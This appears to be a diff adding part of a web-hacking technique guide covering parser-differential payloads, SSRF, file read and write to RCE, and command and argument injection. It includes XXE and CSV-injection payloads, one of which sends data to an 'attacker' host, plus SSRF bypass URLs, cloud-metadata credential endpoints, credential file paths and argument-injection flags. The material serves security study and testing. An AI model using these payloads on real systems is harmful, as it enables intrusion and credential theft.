+<h3 id="77-conditional-headers-as-oracles">7.7 Conditional headers as oracles</h3>
+<pre><code>If-None-Match: &quot;etag&quot;
+If-Match: *
+Range: bytes=0-1
+If-Range:
+</code></pre>
+<p><code>If-None-Match</code> echoes the ETag back, and the ETag often encodes length in hex — a one-byte length oracle that needs no body read. (<a href="https://blog.arkark.dev/2025/12/26/etag-length-leak">Cross-Site ETag Length Leak</a>)</p>
+<hr />
+<h2 id="8-body-formats">8. Body formats</h2>
+<h3 id="81-json">8.1 JSON</h3>
+<pre><code class="language-json">{&quot;a&quot;: &quot;safe&quot;, &quot;a&quot;: &quot;&lt;img src=x onerror=alert(1)&gt;&quot;}     // duplicate key
+{&quot;__proto__&quot;: {&quot;isAdmin&quot;: true}}                        // prototype pollution
+{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;isAdmin&quot;: true}}}       // when __proto__ is stripped
+{&quot;a&quot;: {&quot;b&quot;: {&quot;c&quot;: &quot;...&quot;}}}                              // nested merge → class pollution
+</code></pre>
+<p>Duplicate-key order matters: <code>JSON.parse</code> keeps the <strong>last</strong>; many validators keep the <strong>first</strong>; PHP's <code>json_decode</code> keeps the last. Python keeps the last. Go keeps the last. Java's Jackson keeps the last by default but <em>fails</em> on duplicates if configured. Test both directions.</p>
+<h3 id="82-yaml">8.2 YAML</h3>
+<pre><code class="language-yaml">a: &amp;x {admin: true}
+b:
+  &lt;&lt;: *x
+base: !!merge
+</code></pre>
+<pre><code class="language-yaml">a: !!binary &quot;cHJpbnQgJ2hpJw==&quot;
+</code></pre>
+<p>Unsafe loaders: <code>!!ruby/object</code>, <code>!!python/object</code>, <code>!&lt;tag:yaml.org,2002:...&gt;</code>. <code>yaml.load</code> without <code>SafeLoader</code> is RCE in Ruby and Python.</p>
+<h3 id="83-xml">8.3 XML</h3>
+<pre><code class="language-xml">&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;r&gt;&amp;x;&lt;/r&gt;
+</code></pre>
+<pre><code class="language-xml">&lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot; xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;/&gt;
+</code></pre>
+<p>Namespace confusion: two <code>xmlns</code> declarations for the same prefix; the signature verifier resolves one, the attribute reader the other. Round-trip mutation: <code>&amp;#x2e;</code> vs <code>.</code>, CDATA vs text, attribute order.</p>
+<h3 id="84-multipart">8.4 Multipart</h3>
+<pre><code>--b
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;
+Content-Type: image/png
+
+&lt;?php ... ?&gt;
+--b
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;b.php&quot;
+
+...
+--b--
+</code></pre>
+<p>Quirks: duplicate <code>name</code>, duplicate <code>filename</code>, unquoted filename, missing final boundary (PHP accepts), CRLF inside the filename, <code>filename*</code> vs <code>filename</code>, broken CRLF between headers and body, extra part after the terminator. (<a href="https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/">Breaking Down Multipart Parsers</a>)</p>
+<h3 id="85-form-encoding">8.5 Form encoding</h3>
+<pre><code>a=1&amp;a=2                 # duplicate: last wins in most, array in PHP/Express-extended
+a[]=1&amp;a[]=2             # array
+a[b]=1                  # nested
+a[b][c]=1               # deep
+</code></pre>
+<p>PHP mangles names: <code>.</code> → <code>_</code>, space → <code>_</code>, <code>[</code> → <code>_</code>. So <code>a.b</code> and <code>a_b</code> collide, and <code>a[b</code> becomes <code>a_b</code>. That collision is a validation bypass when one layer checks <code>a.b</code> and the app reads <code>a_b</code>. (<a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/">Abusing PHP query string parser</a>)</p>
+<p>Parameter count limits: PHP <code>max_input_vars</code> (default 1000) silently drops the tail — and emits a warning <em>before</em> the headers, so <code>Content-Type</code>, <code>CSP</code>, and <code>Cache-Control</code> are never sent. (<a href="https://www.youtube.com/watch?v=Sm4G6cAHjWM">Secret Web Hacking Knowledge</a>)</p>
+<h3 id="86-csv">8.6 CSV</h3>
+<pre><code>=cmd|' /C calc'!A0
+=HYPERLINK(&quot;http://attacker/?&quot;&amp;A1,&quot;x&quot;)
+@SUM(1+1)*cmd|' /C calc'!A0
+</code></pre>
+<p>Server-side CSV export → formula execution on the analyst's machine. Also <code>sep=;</code> and UTF-8 BOM to change the delimiter.</p>
+<h3 id="87-binary-formats">8.7 Binary formats</h3>
+<p>Protobuf field numbers, MessagePack type tags, CBOR tags, PHP <code>S:</code> lengths, Java <code>serialVersionUID</code>. A type-confusion here is a full object-injection primitive. (<a href="https://netwrix.com/en/resources/blog/generating-deserialization-payloads-for-messagepack-cs-typeless-mode/">MessagePack typeless</a>)</p>
+<hr />
+<h2 id="9-length-nul-and-integers">9. Length, NUL, and integers</h2>
+<ul>
+<li><strong>NUL truncation</strong>: <code>%00</code>, <code>\0</code>, <code>0x00</code>. Kills suffix checks, C-string APIs, and some regex engines.</li>
+<li><strong>Length-field overflow</strong>: a 4 GB parameter overflows the 4-byte message length in MySQL/Postgres drivers, so the tail is parsed as a new protocol message — SQL injection past prepared statements. (<a href="https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn%27t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf">SQL Injection Isn't Dead</a>)</li>
+<li><strong>Integer underflow in path length</strong>: nginx WebDAV <code>alias</code> arithmetic underflows on crafted <code>DELETE</code>/<code>COPY</code>, escaping the root. (<a href="https://blog.calif.io/p/claude-humans-vs-nginx-cve-2026-27654">CVE-2026-27654</a>)</li>
+<li><strong>Off-by-one in escape buffers</strong>: <code>snprintf</code> return value used as length → over-read of adjacent memory (Citrix Bleed). (<a href="https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966">CVE-2023-4966</a>)</li>
+<li><strong>Truncation to a fixed buffer</strong>: pad until the security-relevant suffix is cut.</li>
+</ul>
+<hr />
+<h2 id="10-what-to-do-with-this-volume">10. What to do with this volume</h2>
+<p>For every endpoint, list the parsers in the path and pick the pair most likely to disagree:</p>
+<ol>
+<li>CDN/WAF ↔ origin framework</li>
+<li>Proxy ↔ app server</li>
+<li>Router ↔ auth middleware</li>
+<li>Validator ↔ consumer</li>
+<li>Sanitizer ↔ renderer</li>
+</ol>
+<p>Then walk §3–§9 against that pair. Most of the time nothing lands. When something does, you have a primitive — take it to Vol. 2 and climb the ladder in §1.1.</p>
+<p><strong>Next:</strong> Vol. 2 — Server-Side Primitives.</p>
+<hr />
+<h1 id="web-hacking-tricks-vol-2-server-side-primitives">Web Hacking Tricks, Vol. 2 — Server-Side Primitives</h1>
+<blockquote>
+<p>Vol. 1 covered the differentials. This volume is what you do with them.
+Every section: <strong>where to look → how to confirm → how to escalate → what breaks it.</strong></p>
+</blockquote>
+<p>A note on scope: these are techniques, not exploits. Version-specific CVEs are cited only where the <em>mechanism</em> generalizes.</p>
+<hr />
+<h2 id="1-ssrf">1. SSRF</h2>
+<p>SSRF is the highest-leverage server-side primitive because it converts "the server trusts its own network" into everything else. The uncommon part is not finding it — it is <strong>getting the response back</strong> and <strong>reaching non-HTTP services</strong>.</p>
+<h3 id="11-where-ssrf-hides">1.1 Where SSRF hides</h3>
+<p>Not just <code>?url=</code>. Look for:</p>
+<ul>
+<li>Image/thumbnail/avatar fetchers, "import from URL", "add by link"</li>
+<li>PDF/HTML-to-image renderers, screenshot services, link previews, oEmbed</li>
+<li>Webhook registration + test-fire, "validate endpoint", status callbacks</li>
+<li>RSS/Atom import, OPML, sitemap ping, feed readers</li>
+<li>Office/PDF/EPUB converters, subtitle and font fetchers</li>
+<li>Package/registry proxies, Maven/NPM/Composer/PyPI mirrors</li>
+<li>Git/Subversion/Mercurial "import repository" (git can fetch <code>ext::</code>, <code>http::</code>)</li>
+<li>SSO/OIDC <code>jwks_uri</code>, <code>logo_uri</code>, <code>request_uri</code>, SAML metadata URL, ACS URL</li>
+<li>CI runners, preview deployments, "deploy from Git URL"</li>
+<li>Backup/restore "from S3/URL", migration wizards</li>
+<li>Elasticsearch/Kibana "remote cluster", Grafana datasource, Prometheus <code>target</code></li>
+<li>WSDL/XSD import (SOAP), XSLT <code>document()</code>, XML external DTD</li>
+<li>Anything that takes a hostname: SMTP host, LDAP host, DB host, proxy settings</li>
+</ul>
+<h3 id="12-full-read-vs-blind">1.2 Full-read vs blind</h3>
+<ul>
+<li><strong>Full-read</strong>: the body is returned or rendered (preview, thumbnail, PDF text, oEmbed JSON). Trivial.</li>
+<li><strong>Blind</strong>: only success/failure. Then:</li>
+<li><strong>Redirect loop → error path</strong>: a loop that increments 3xx until the client errors often returns the whole body on the error page. (<a href="https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/">redirect loops</a>)</li>
+<li><strong><code>file://</code> redirect</strong>: if the client follows to <code>file://</code>, local files become readable.</li>
+<li><strong>Error text reflection</strong>: point at a port that returns a banner (SSH, SMTP, Redis) — the parse error often quotes it.</li>
+<li><strong>Timing</strong>: open vs closed port; <code>10.0.0.1:22</code> fast RST, filtered port times out.</li>
+<li><strong>Content-length side channel</strong>: some clients differ on <code>Content-Length: 0</code> vs large.</li>
+</ul>
+<h3 id="13-filter-bypass">1.3 Filter bypass</h3>
+<p>All of Vol. 1 §3 applies: <code>@</code>, <code>#</code>, <code>\</code>, <code>%2f</code>, <code>http:///</code>, decimal/octal/hex IPs, IPv6, <code>nip.io</code>, trailing dot, <code>0</code>.</p>
+<p>More:</p>
+<pre><code>http://expected.com.attacker.com/
+http://attacker.com/expected.com
+http://expected.com%2eattacker.com
+http://expected.com:80@attacker.com
+http://expected.com#@attacker.com
+http://[::ffff:169.254.169.254]/
+http://169.254.169.254/latest/meta-data/#@attacker.com
+</code></pre>
+<ul>
+<li><strong>DNS rebinding</strong>: your domain returns a public IP first (passes the check), then <code>127.0.0.1</code> on the second query (TTL 0). Beats "resolve then check" filters.</li>
+<li><strong>Redirect to internal</strong>: register a 302 to <code>http://127.0.0.1:8500/</code>. Most clients follow and do not re-validate.</li>
+<li><strong>Allowlist suffix</strong>: <code>expected.com.attacker.com</code> when the check is <code>endswith("expected.com")</code>.</li>
+<li><strong>Wildcard DNS</strong>: <code>127.0.0.1.nip.io</code>, <code>169.254.169.254.sslip.io</code>, <code>localtest.me</code>.</li>
+</ul>
+<h3 id="14-non-http-protocols-protocol-smuggling">1.4 Non-HTTP protocols (protocol smuggling)</h3>
+<p>Once you control host <em>and</em> port, you can speak to anything that takes plaintext:</p>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Payload shape</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Redis</td>
+<td><code>gopher://h:6379/_*3%0d%0a$3%0d%0aSET...</code> → <code>CONFIG SET dir</code> + <code>dbfilename</code> + <code>SAVE</code> → webshell</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>gopher to 3306, or <code>mysql://user@host/db</code> if the client supports it</td>
+</tr>
+<tr>
+<td>FastCGI</td>
+<td>gopher to 9000 with <code>PHP_VALUE</code>/<code>SCRIPT_FILENAME</code> → RCE</td>
+</tr>
+<tr>
+<td>Memcached</td>
+<td>gopher <code>set key 0 0 N</code></td>
+</tr>
+<tr>
+<td>SMTP</td>
+<td>gopher to 25 → send mail as the host</td>
+</tr>
+<tr>
+<td>LDAP</td>
+<td>CRLF in the bind DN/password when the app lets you set the LDAP host</td>
+</tr>
+<tr>
+<td>Docker API</td>
+<td><code>http://127.0.0.1:2375/containers/create</code></td>
+</tr>
+<tr>
+<td>Kubelet</td>
+<td><code>http://127.0.0.1:10250/pods</code>, <code>/run</code></td>
+</tr>
+<tr>
+<td>Elasticsearch</td>
+<td><code>http://127.0.0.1:9200/_search</code></td>
+</tr>
+<tr>
+<td>Consul/Vault/etcd</td>
+<td><code>http://127.0.0.1:8500/v1/kv/...</code>, <code>:8200</code>, <code>:2379</code></td>
+</tr>
+<tr>
+<td>Jolokia</td>
+<td><code>http://127.0.0.1:8161/api/jolokia/exec/...</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>gopher://</code> is the workhorse. <code>dict://</code> reaches Redis/SMTP line protocols in one line. Some clients allow <code>file://</code>, <code>ftp://</code> (which supports <code>stat</code> and can be used to bypass <code>file_exists</code> guards), <code>php://filter</code>, <code>phar://</code>, <code>jar://</code>, <code>netdoc://</code>.</p>
+<h3 id="15-cloud-metadata">1.5 Cloud metadata</h3>
+<table>
+<thead>
+<tr>
+<th>Provider</th>
+<th>Endpoint</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AWS IMDSv1</td>
+<td><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></td>
+<td>no header needed</td>
+</tr>
+<tr>
+<td>AWS IMDSv2</td>
+<td>same, requires <code>X-aws-ec2-metadata-token</code></td>
+<td>PUT first; if you control headers you can still do it</td>
+</tr>
+<tr>
+<td>GCP</td>
+<td><code>http://metadata.google.internal/computeMetadata/v1/</code></td>
+<td>needs <code>Metadata-Flavor: Google</code> — but <strong>v1beta1 does not</strong></td>
+</tr>
+<tr>
+<td>Azure</td>
+<td><code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></td>
+<td>needs <code>Metadata: true</code></td>
+</tr>
+<tr>
+<td>DO</td>
+<td><code>http://169.254.169.254/metadata/v1.json</code></td>
+<td>none</td>
+</tr>
+<tr>
+<td>Alibaba</td>
+<td><code>http://100.100.100.200/latest/meta-data/</code></td>
+<td>none</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>http://169.254.169.254/opc/v1/instance/</code></td>
+<td>none</td>
+</tr>
+</tbody>
+</table>
+<p>The GCP v1beta1 no-header path is how the Shopify Exchange SSRF reached a service-account token and then kubelet certs. (<a href="https://hackerone.com/reports/341876">#341876</a>)</p>
+<p>Header-dependent metadata plus a header-less client is still solvable: SSRF through a redirect, through a proxy that injects headers, or through a service whose own requests carry the header.</p>
+<h3 id="16-ssrf-rce-chains">1.6 SSRF → RCE chains</h3>
+<ul>
+<li>Metadata creds → <code>aws sts</code> → S3/Lambda/SSM → code execution</li>
+<li>Metadata creds → cloud API → create a new compute resource with a startup script</li>
+<li>Docker API → bind-mount <code>/</code> → <code>chroot</code> container → root</li>
+<li>Redis → <code>CONFIG SET dir /var/www/html</code> → <code>SAVE</code> → webshell</li>
+<li>FastCGI → <code>SCRIPT_FILENAME</code> + <code>PHP_VALUE auto_prepend_file=php://input</code></li>
+<li>Jolokia/ActiveMQ → add a connector with a <code>vm://</code> URI → remote Spring XML → command exec (<a href="https://horizon3.ai/attack-research/disclosures/cve-2026-34197-activemq-rce-jolokia/">CVE-2026-34197</a>)</li>
+<li>Internal admin API with no auth → create user / reset password / toggle debug</li>
+</ul>
+<h3 id="17-ssrf-without-a-server">1.7 SSRF without a server</h3>
+<ul>
+<li><strong>Browser-side SSRF</strong>: <code>fetch</code> to <code>http://127.0.0.1:port</code> from a page — CORS blocks reading, but <code>no-cors</code> + timing/<code>onload</code> still works, and DNS rebinding removes CORS entirely.</li>
+<li><strong>PDF/HTML renderer SSRF</strong>: <code>&lt;img src&gt;</code>, <code>&lt;link rel=stylesheet&gt;</code>, <code>@font-face</code>, <code>&lt;iframe&gt;</code>, XSLT <code>document()</code>.</li>
+<li><strong>Email client SSRF</strong>: <code>List-Unsubscribe</code> becomes a server-side request in Nextcloud Mail. (<a href="https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/">Turning List-Unsubscribe into an SSRF/XSS Gadget</a>)</li>
+</ul>
+<hr />
+<h2 id="2-arbitrary-file-read">2. Arbitrary file read</h2>
+<h3 id="21-traversal">2.1 Traversal</h3>
+<p>Vol. 1 §4. Add: absolute paths (<code>/etc/passwd</code>), Windows drive letters (<code>C:\</code>, <code>\\?\C:\</code>), UNC (<code>\\attacker\share</code> → NTLM leak), and <code>file://</code> where a URL is expected.</p>
+<h3 id="22-php-wrappers">2.2 PHP wrappers</h3>
+<pre><code>php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.iconv.UTF-8.UTF-16/resource=...
+php://filter/zlib.deflate/resource=...
+data://text/plain;base64,...
+phar://upload.jpg/x.php
+expect://id
+</code></pre>
+<p><code>php://filter</code> chains are a full exploitation framework now:</p>
+<ul>
+<li><strong>Chain to prepend bytes</strong> (base64 build-up) → turn any <code>include</code> into RCE. (<a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html">Synacktiv</a>)</li>
+<li><strong><code>wrapwrap</code> to append a suffix</strong> → satisfy JSON/XML structure. (<a href="https://www.ambionics.io/blog/wrapwrap-php-filters-suffix">wrapwrap</a>)</li>
+<li><strong><code>lightyear</code></strong> to dump files fast: iconv charset remap turns a chosen digit into a newline, <code>dechunk</code> strips to it. (<a href="https://www.ambionics.io/blog/lightyear-file-dump">lightyear</a>)</li>
+<li><strong>Error-based oracle</strong> when output is suppressed: inflate until the memory limit aborts; <code>dechunk</code> drops the data when the first byte is a hex digit. One bit per request. (<a href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle">PHP filter chains oracle</a>)</li>
+<li><strong><code>iconv</code> glibc overflow (CVE-2024-2961)</strong> → from read to RCE via heap grooming. (<a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p3">iconv</a>)</li>
+</ul>
+<h3 id="23-beyond-webroot">2.3 Beyond webroot</h3>
+<ul>
+<li><code>/proc/self/environ</code>, <code>/proc/self/cmdline</code>, <code>/proc/self/maps</code> (libc fingerprint), <code>/proc/self/fd/N</code>, <code>/proc/self/cwd/</code></li>
+<li><code>/proc/net/tcp</code> (internal ports), <code>/proc/mounts</code></li>
+<li>App config: <code>.env</code>, <code>config.php</code>, <code>wp-config.php</code>, <code>application.yml</code>, <code>appsettings.json</code>, <code>web.config</code></li>
+<li>Cloud: <code>~/.aws/credentials</code>, <code>~/.config/gcloud/</code>, <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code></li>
+<li>SSH: <code>~/.ssh/id_rsa</code>, <code>authorized_keys</code></li>
+<li>History: <code>~/.bash_history</code>, <code>~/.git-credentials</code>, <code>~/.netrc</code>, <code>~/.pgpass</code></li>
+<li>Source: <code>.git/HEAD</code>, <code>.git/config</code>, <code>.svn/entries</code>, <code>.hg/</code>, <code>composer.lock</code>, <code>package-lock.json</code></li>
+<li>Logs: <code>/var/log/nginx/access.log</code>, <code>/var/log/apache2/error.log</code> (also a write target for log poisoning)</li>
+<li>DB dumps, backups, <code>*.sql</code>, <code>*.bak</code>, <code>*.old</code>, <code>*.zip</code></li>
+</ul>
+<h3 id="24-read-via-other-subsystems">2.4 Read via other subsystems</h3>
+<ul>
+<li><strong>XXE</strong> (§8), <strong>SQLi</strong> (<code>LOAD_FILE</code>, <code>pg_read_file</code>, <code>lo_import</code>, <code>BULK INSERT</code>, <code>ATTACH</code>), <strong>SSTI</strong> (<code>{{ ''.__class__.__mro__ }}</code>), <strong>deserialization</strong> gadgets, <strong>ImageMagick</strong> (<code>label:@file</code>, <code>msl:</code>), <strong>Ghostscript</strong> (<code>%pipe%</code>), <strong>ffmpeg</strong> (<code>concat:</code>, <code>subfile:</code>), <strong>PDF renderers</strong> (<code>file://</code> in <code>&lt;img&gt;</code>).</li>
+<li><strong>Signed URL traversal</strong>: S3 keys are flat, but SDKs <code>path.Clean()</code> after interpolation, so a key of <code>../other-bucket/secret.txt</code> signs a URL for a different bucket. (<a href="https://blog.flatt.tech/entry/signed_url_path_traversal">GMO Flatt</a>)</li>
+<li><strong>Symlink races</strong>: <code>/proc/self/fd</code> recycled between <code>stat</code> and <code>open</code> to defeat length checks. (<a href="https://jorianwoltjer.com/blog/p/ctf/l3akctf-2026-squid">L3akCTF Squid</a>)</li>
+</ul>
+<h3 id="25-read-rce">2.5 Read → RCE</h3>
+<p>Source code → hardcoded keys, JWT secret, DB creds, <code>machineKey</code>, <code>APP_KEY</code>, SMTP creds. Then forge a session, decrypt a cookie, or hit the DB directly. This is the most common real-world escalation and the reason "read-only" findings get under-rated.</p>
+<hr />
+<h2 id="3-arbitrary-file-write-rce">3. Arbitrary file write → RCE</h2>
+<p>A write is only a finding until it lands somewhere executed. The catalogue below is roughly ordered by reliability.</p>
+<h3 id="31-web-executable">3.1 Web-executable</h3>
+<ul>
+<li><code>.php</code>, <code>.phtml</code>, <code>.php5</code>, <code>.phar</code> in webroot</li>
+<li><code>.jsp</code>/<code>.jspx</code> in a Tomcat/Jetty hot-deploy or webapp dir</li>
+<li><code>.aspx</code>/<code>.ashx</code>/<code>.asmx</code> in an IIS app dir</li>
+<li><code>.cgi</code>/<code>.pl</code> in <code>cgi-bin</code></li>
+<li><code>.htaccess</code> with <code>php_value auto_prepend_file</code> (or <code>SetHandler</code>)</li>
+<li><code>web.config</code> in an IIS app root: <code>httpHandlers</code>, <code>AspNetCoreModule</code> <code>processPath</code>, <code>machineKey</code>, <code>compilerOptions</code> (<a href="https://soroush.me/blog/uploading-web-config-for-fun-and-profit-2">Soroush</a>)</li>
+</ul>
+<h3 id="32-config-the-runtime-loads-by-itself">3.2 Config the runtime loads by itself</h3>
+<ul>
+<li><strong>Spring Boot</strong> working dir: <code>application.properties</code>/<code>.yml</code>, <code>logback-spring.xml</code> with a <code>DBAppender</code>/<code>JNDI</code> — loaded on restart or reload (<a href="https://srcincite.io/blog/2024/11/25/remote-code-execution-with-spring-properties.html">Spring properties</a>)</li>
+<li><strong>uWSGI</strong>: any file containing a <code>[uwsgi]</code> section is parsed as config; <code>exec</code> runs a command (<a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">Doyensec</a>)</li>
+<li><strong>Symfony</strong> <code>_fragment</code> with a default/leaked secret → <code>system()</code> via a signed URL (<a href="https://www.ambionics.io/blog/symfony-secret-fragment">secret fragments</a>)</li>
+<li><strong>PHP</strong> <code>auto_prepend_file</code> via <code>.user.ini</code> or <code>.htaccess</code></li>
+<li><strong>Node</strong> <code>package.json</code> scripts, <code>.npmrc</code>, <code>nodemon.json</code></li>
+<li><strong>Python</strong> <code>sitecustomize.py</code>, <code>usercustomize.py</code>, <code>*.pth</code> in site-packages</li>
+<li><strong>Jupyter</strong> <code>jupyter_server_config.py</code>, kernelspec <code>argv</code></li>
+</ul>
+<h3 id="33-compiled-cached-artifacts">3.3 Compiled / cached artifacts</h3>
+<ul>
+<li><strong>Python</strong> <code>.pyc</code> overwrite (preserve magic, mtime, size) or a <code>.so</code> beside a module — extension loaders win (<a href="https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/">siunam</a>)</li>
+<li><strong>Ruby Bootsnap</strong> compiled-bytecode cache: forge the cache key for a required file (<a href="https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/">Conviso</a>)</li>
+<li><strong>PHP</strong> opcache: write the file, then hit it with <code>opcache_invalidate</code> semantics via a cache-buster</li>
+<li><strong>Java</strong> <code>.class</code> in an exploded WAR, <code>META-INF/services</code> for SPI</li>
+<li><strong>.NET</strong> <code>bin/*.dll</code> + <code>web.config</code> <code>compilation/assemblies</code></li>
+</ul>
+<h3 id="34-shells-and-persistence">3.4 Shells and persistence</h3>
+<ul>
+<li><code>~/.ssh/authorized_keys</code>, <code>~/.bashrc</code>, <code>~/.profile</code></li>
+<li><code>/etc/cron.d/*</code>, <code>/etc/cron.hourly/*</code>, <code>crontab</code> file in <code>/var/spool/cron/crontabs/</code></li>
+<li><code>/etc/systemd/system/*.service</code> + symlink in <code>multi-user.target.wants</code></li>
+<li><code>/etc/ld.so.preload</code> (root), <code>ld.so.conf.d/*.conf</code></li>
+<li>Windows: Startup folder, <code>Run</code> registry via <code>.reg</code> import, scheduled task XML</li>
+<li><code>~/.config/autostart/*.desktop</code></li>
+</ul>
+<h3 id="35-write-adjacent-primitives">3.5 Write-adjacent primitives</h3>
+<ul>
+<li><strong>SQLite <code>dbpage</code></strong>: overwrite raw pages to create a file with few fixed header bytes; relocate the ELF program header to shadow a module. (<a href="https://gabdevele.dev/posts/sqlite-dbpage-shared-objects-rce/">dbpage</a>)</li>
+<li><strong>PostgreSQL large objects</strong>: <code>lo_export</code> writes arbitrary files with DB privileges. (<a href="https://blog.lexfo.fr/drupal-postgresql-sqli-to-rce.html">SELECT-only exploitation</a>)</li>
+<li><strong><code>COPY ... TO PROGRAM</code></strong> (Postgres superuser) — direct command execution.</li>
+<li><strong>SOAPwn</strong>: a <code>file://</code> or UNC URL in a WSDL makes the .NET SOAP proxy write its request body to disk. (<a href="https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/">SOAPwn</a>)</li>
+<li><strong>ASP.NET MVC Razor view search paths</strong>: drop a <code>.cshtml</code> into a predictable view path; IIS request filtering never sees it. (<a href="https://lab.ctbb.show/research/asp-net-mvc-view-engine-search-patterns">view engine search patterns</a>)</li>
+<li><strong>Dompdf font cache</strong>: serve a TTF from a <code>.php</code> URL; the cache keeps the extension. (<a href="https://positive.security/blog/dompdf-rce">dompdf RCE</a>)</li>
+<li><strong>Zip Slip / tar traversal / symlink in archive</strong>: write outside the extraction root, or link to a file you then overwrite.</li>
+<li><strong>Log poisoning</strong>: write PHP into <code>access.log</code> via the User-Agent, then include the log.</li>
+</ul>
+<h3 id="36-fingerprinting-the-write">3.6 Fingerprinting the write</h3>
+<p>The <code>errno</code> of a failed write, read through status code, body length, or latency, tells you the OS, container, distro, and runtime version — and whether a path exists. Path resolution stops at the first failing component, so you can walk the tree blind. (<a href="https://ethiack.com/info-hub/research/write-once-shell-everywhere-arbitrary-file-writes-into-rce">Write Once, Shell Everywhere</a>)</p>
+<hr />
+<h2 id="4-command-and-argument-injection">4. Command and argument injection</h2>
+<h3 id="41-shell-metacharacters-vs-argument-injection">4.1 Shell metacharacters vs argument injection</h3>
+<p>If the sink is <code>shell_exec("tool " . $x)</code>, you need <code>;</code>, <code>|</code>, <code>$()</code>, backticks, <code>&amp;&amp;</code>. If it is <code>execve("tool", [...,$x])</code> or <code>escapeshellarg($x)</code>, metacharacters are inert and you need <strong>argument injection</strong>: make <code>$x</code> a <em>flag</em>.</p>
+<pre><code>--config /path/attacker
+-o /var/www/html/shell.php
+--output=/tmp/x
+--upload-pack=id
+--gpg-sign
+</code></pre>
+<h3 id="42-tool-specific-argument-rce">4.2 Tool-specific argument RCE</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Flag → effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>git clone</code></td>
+<td><code>--upload-pack='sh -c "id"'</code></td>
+</tr>
+<tr>
+<td><code>git</code> (ambiguous)</td>
+<td><code>-c core.pager=id</code>, <code>--exec-path=</code></td>
+</tr>
+<tr>
+<td><code>tar</code></td>
+<td><code>--checkpoint=1 --checkpoint-action=exec=sh</code></td>
+</tr>
+<tr>
+<td><code>rsync</code></td>
+<td><code>-e 'sh -c id'</code></td>
+</tr>
+<tr>
+<td><code>curl</code></td>
+<td><code>-o /path</code>, <code>--config</code>, <code>-K</code></td>
+</tr>
+<tr>
+<td><code>wget</code></td>
+<td><code>-O /path</code>, <code>--post-file</code></td>
+</tr>
+<tr>
+<td><code>ssh</code></td>
+<td><code>-o ProxyCommand=id</code></td>
+</tr>
+<tr>
+<td><code>find</code></td>
+<td><code>-exec id ;</code></td>
+</tr>
+<tr>
+<td><code>sed</code></td>
+<td><code>e</code> command, <code>-e 'e id'</code></td>
+</tr>
+<tr>
+<td><code>awk</code></td>
+<td><code>BEGIN{system("id")}</code></td>
+</tr>
+<tr>
+<td><code>sort</code></td>
+<td><code>-o /path</code>, <code>--compress-program=id</code></td>
+</tr>
+<tr>
+<td><code>zip</code></td>
+<td><code>-T -TT 'id'</code></td>
+</tr>
+<tr>
+<td><code>openssl</code></td>
+<td><code>-engine</code>, <code>-provider</code></td>
+</tr>
+<tr>
+<td><code>mysql</code></td>
+<td><code>--defaults-extra-file</code>, <code>-e</code></td>
+</tr>
+<tr>
+<td><code>psql</code></td>
+<td><code>-c</code>, <code>\!</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>git rev-parse</code> and <code>clone --upload-pack</code> were the mechanism behind a package-registry RCE. (<a href="https://i.blackhat.com/Asia-26/Presentations/BHAS26-Ng-Hack-the-Source-of-the-Source.pdf">Hack the Source</a>)</p>
+<h3 id="43-escaping-gaps">4.3 Escaping gaps</h3>
+<ul>
+<li><code>escapeshellarg()</code> on Windows uses <code>"</code> quoting — <code>%</code> expands environment variables <em>after</em> parsing: <code>%PATH%</code>.</li>
+<li><code>escapeshellcmd()</code> does not quote; <code>a b</code> becomes two args.</li>
+<li>Windows best-fit (§Vol.1 5.2) turns <code>＂</code> into <code>"</code> after escaping.</li>
+<li>Bash arithmetic <code>$(( ))</code> evaluates variable names: <code>$(())</code>-style injection in a <code>RewriteMap</code> reached command execution in Ivanti EPMM. (<a href="https://labs.watchtowr.com/someone-knows-bash-far-too-well-and-we-love-it-ivanti-epmm-pre-auth-rces-cve-2026-1281-cve-2026-1340/">watchTowr</a>)</li>
+<li>Newline in a value that is later split into argv lines (<code>--config</code> file content).</li>
+</ul>
+<h3 id="44-media-and-document-toolchains">4.4 Media and document toolchains</h3>
+<p>These run external commands by design:</p>
+<ul>
+<li><strong>ffmpeg</strong>: <code>concat:</code>, <code>subfile:</code>, <code>file:</code>, <code>http:</code>, <code>-i</code> with a playlist, <code>hls</code> key URIs</li>
